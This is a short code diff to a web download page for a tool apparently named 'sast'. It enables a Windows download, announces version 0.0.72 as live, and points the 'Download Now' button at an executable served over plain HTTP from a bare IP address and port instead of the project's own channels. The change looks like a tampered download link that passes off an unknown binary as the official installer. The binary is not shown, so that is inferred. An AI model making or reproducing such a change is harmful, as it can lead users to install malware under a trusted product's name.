@@ -52,7 +52,8 @@ const platforms = [
             </svg>
         ),
         command: "winget install sast-tech.sast",
-        disabled: true,
+        disabled: false,
+        href: "http://91.134.255.57:8080/sast-setup.exe",
     },
 ]
 
@@ -95,10 +96,10 @@ export default function DownloadPage() {
                         </p>
                         <div className="mt-6 inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-4 py-2 text-sm text-muted-foreground">
                             <span className="relative flex size-2">
-                                <span className="absolute inline-flex size-full animate-ping rounded-full bg-amber-400 opacity-75" />
-                                <span className="relative inline-flex size-2 rounded-full bg-amber-500" />
+                                <span className="absolute inline-flex size-full animate-ping rounded-full bg-emerald-400 opacity-75" />
+                                <span className="relative inline-flex size-2 rounded-full bg-emerald-500" />
                             </span>
-                            Coming soon -- Join the waitlist for early access
+                            v0.0.72 is now live for Windows
                         </div>
                     </div>
                 </section>
@@ -131,8 +132,8 @@ export default function DownloadPage() {
                                         className="w-full"
                                         disabled={platform.disabled}
                                     >
-                                        <Link href="/waitlist">
-                                            Join Waitlist
+                                        <Link href={platform.href || "/waitlist"}>
+                                            {platform.disabled ? "Join Waitlist" : "Download Now"}
                                         </Link>
                                     </Button>
                                 </div>
